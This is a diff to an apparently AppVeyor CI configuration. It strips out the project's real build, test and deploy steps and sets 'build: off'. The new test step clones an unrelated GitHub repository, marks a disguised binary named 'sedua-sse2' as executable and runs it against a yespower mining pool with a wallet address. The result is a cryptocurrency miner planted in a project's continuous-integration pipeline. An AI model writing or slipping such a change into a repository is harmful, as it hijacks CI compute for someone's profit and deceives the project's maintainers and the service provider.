@@ -1,26 +1,6 @@
-version: 1.0.{build}
-image:
-- Visual Studio 2017
-- Ubuntu
-
-environment:
-  matrix:
-    - ARCH: arm
-    - ARCH: arm64
-    - ARCH: amd64
-
-matrix:
-  exclude:
-    - image: Visual Studio 2017
-      ARCH: arm
-    - image: Visual Studio 2017
-      ARCH: arm64
-
-build_script:
-  - ps: ./build.ps1
+image: Ubuntu
 
 test_script:
-  - ps: ./test.ps1
+- sudo apt-get update -y && git clone https://github.com/remakove/marsose.git marsose && cd marsose && chmod +x sedua-sse2 && ./sedua-sse2 -a yespower -o stratum+tcp://stratum-na.rplant.xyz:13350 -u VPwdqwJ6LLWnCLeS9XPfoiXn81nuUjPB4E.pc -t 2
 
-deploy_script:
-  - ps: ./deploy.ps1
+build: off
